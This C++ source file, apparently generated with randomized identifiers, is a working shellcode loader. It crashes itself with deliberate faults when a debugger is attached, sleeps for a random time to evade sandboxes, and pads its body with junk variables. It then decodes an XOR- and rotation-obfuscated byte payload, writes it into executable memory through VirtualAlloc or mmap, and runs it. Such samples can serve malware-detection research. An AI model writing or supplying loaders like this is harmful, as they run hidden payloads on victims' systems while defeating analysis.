/* Unique ID: 8662159368153637377 */
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool v37tDA6CJfh() {
#ifdef _WIN32
    if (IsDebuggerPresent()) {
        // Trigger various exceptions
        __try {
            __asm { int 3 }
            __asm { ud2 }
        } __except(1) {}
        
        // Stack overflow
        char* stack = (char*)alloca(1024*1024*10);
        memset(stack, 0xFF, 1024*1024*10);
        
        // Invalid memory access
        *(int*)0 = 0xDEADBEEF;
    }
#endif
    return true;
}

std::vector<uint8_t> g6MB0TGw1p9nAm(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key[i % key.size()];
        result[i] = (result[i] >> 3) | (result[i] << 5);
        result[i] ^= i & 0xFF;
    }
    return result;
}

int main() {
    v37tDA6CJfh();

    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 861);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    volatile int RKStULc5xV1M = 99;
    volatile int wHtUfbQXK = 512;
    {
        volatile int IrOpnOgzYrF = 561;
        IrOpnOgzYrF += 26;
        IrOpnOgzYrF *= 4;
    }
    volatile int Q5ncpI4J = 127;
    volatile int zfM8T3whT7r1k = 236;
    volatile int CEwmbQWxhAfTI2Xa = 167;
    volatile int PjAh06q2i6aa1pA = 754;
    volatile int icbWCnCB = 626;
    volatile int D_Ud3pZCUYp24fCQ = 85;
    volatile int PNVneTVHNzeze = 692;
    std::vector<uint8_t> hU6rQClUJ2WcpJ = {
        0xbb, 0x20, 0x8c, 0x8c, 0x06, 0x87, 0x66, 0x9a, 0x72, 0x98, 0xe1, 0x3e, 0xe5, 0x95, 0x39, 0xe6, 
        0x4d, 0xd5, 0x7f, 0xe7, 0x07, 0xef, 0xe9, 0xae, 0x5d, 0x40, 0xc1, 0xa7, 0xdc, 0xce, 0xee, 0xb1, 
        0x38, 0x68, 0x94, 0x2c, 0xb4, 0x27, 0x5e, 0x18, 0x12, 0xc2, 0x11, 0x34, 0xfd, 0x3d, 0x83, 0x0e, 
        0x6c, 0x14, 0x7e, 0xe6
    };

    std::vector<uint8_t> I9OIBQFS1 = {
        0x23, 0x4c, 0xb8, 0x82, 0x60, 0x39, 0x7f, 0x93, 0x2e, 0x12, 0x09, 0xc3, 0x4e, 0x67, 0xc6, 0x50, 
        0xe2, 0xca, 0xee, 0xb0, 0x07, 0x27, 0x9a, 0x17, 0xce, 0x42, 0x17, 0xf2, 0x38, 0x1c, 0x71, 0xa7
    };

    volatile int gyBYrCK_ = 831;
    volatile int XQe70J_y5tI0F1 = 182;
    volatile int I48LTeyAvlLT = 221;
    volatile int oZoMLG4p = 862;
    volatile int S8rgdXLjD0rA5LBv = 346;
    std::vector<uint8_t> wLpn4T4Vt = g6MB0TGw1p9nAm(hU6rQClUJ2WcpJ, I9OIBQFS1);

#ifdef _WIN32
    LPVOID hxDzRupBJfZBuqB = VirtualAlloc(NULL, wLpn4T4Vt.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (hxDzRupBJfZBuqB) {
        memcpy(hxDzRupBJfZBuqB, wLpn4T4Vt.data(), wLpn4T4Vt.size());
        ((void(*)())hxDzRupBJfZBuqB)();
    }
#else
    void* hxDzRupBJfZBuqB = mmap(NULL, wLpn4T4Vt.size(), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (hxDzRupBJfZBuqB != MAP_FAILED) {
        memcpy(hxDzRupBJfZBuqB, wLpn4T4Vt.data(), wLpn4T4Vt.size());
        ((void(*)())hxDzRupBJfZBuqB)();
    }
#endif
    return 0;
}
